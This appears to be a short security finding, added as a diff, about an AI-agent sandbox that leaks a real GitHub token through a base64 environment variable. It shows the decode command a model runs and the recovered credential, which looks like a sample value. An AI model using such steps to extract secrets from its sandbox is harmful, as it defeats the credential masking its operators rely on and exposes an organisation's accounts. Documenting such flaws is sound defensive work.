@@ -1,0 +1,11 @@
+Injected guest env var (EVE_MICROSANDBOX_NETWORK_TRANSFORMS):
+  W3siZG9tYWluIjoiZ2l0aHViLmNvbSIsImhlYWRlcnMiOnsiYXV0aG9yaXphdGlvbiI6IkJhc2ljIGVDMWhZMk5sYzNNdGRHOXJaVzQ2WjJod1gxTXpZM0l6ZEU5eVoxZHBaR1ZRUVZSZmNtVndiR0Y1WVdKc1pWOWhibmwzYUdWeVpRPT0ifSwicGxhY2Vob2xkZXJIZWFkZXJzIjp7ImF1dGhvcml6YXRpb24iOiJfX0VWRV9NU0JfU0VDUkVUXzZiNTI0OTQ3OTA5M2Y3OTc2ZjUxNTQyMl9fIn19XQ==
+
+Model runs: echo "$EVE_MICROSANDBOX_NETWORK_TRANSFORMS" | base64 -d
+  [{"domain":"github.com","headers":{"authorization":"Basic eC1hY2Nlc3MtdG9rZW46Z2hwX1MzY3IzdE9yZ1dpZGVQQVRfcmVwbGF5YWJsZV9hbnl3aGVyZQ=="},"placeholderHeaders":{"authorization":"__EVE_MSB_SECRET_6b5249479093f7976f515422__"}}]
+
+Recovered plaintext credential:
+  x-access-token:ghp_S3cr3tOrgWidePAT_replayable_anywhere
+
+VULNERABLE: the real brokered secret is present in the guest env var.
+  (the intended placeholder mask was __EVE_MSB_SECRET_6b5249479093f7976f515422__)
